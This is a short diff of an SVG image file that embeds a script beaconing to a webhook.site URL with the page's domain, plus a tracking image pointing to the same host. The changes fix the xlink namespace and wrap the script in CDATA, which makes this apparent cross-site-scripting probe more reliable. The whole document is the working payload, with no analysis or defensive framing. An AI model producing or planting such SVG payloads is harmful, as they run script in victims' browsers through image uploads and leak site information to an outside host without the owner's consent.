@@ -1,6 +1,6 @@
-<svg xmlns="http://www.w3.org/2000/svg">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
   <image xlink:href="https://webhook.site/39afdc84-2031-4247-9044-5651b38f456d?via=img" height="100" width="100"/>
-  <script>
-    new Image().src='https://webhook.site/39afdc84-2031-4247-9044-5651b38f456d?via=js&domain='+document.domain;
-  </script>
+  <script type="application/ecmascript"><![CDATA[
+    new Image().src = "https://webhook.site/39afdc84-2031-4247-9044-5651b38f456d?via=js&amp;domain=" + document.domain;
+  ]]></script>
 </svg>
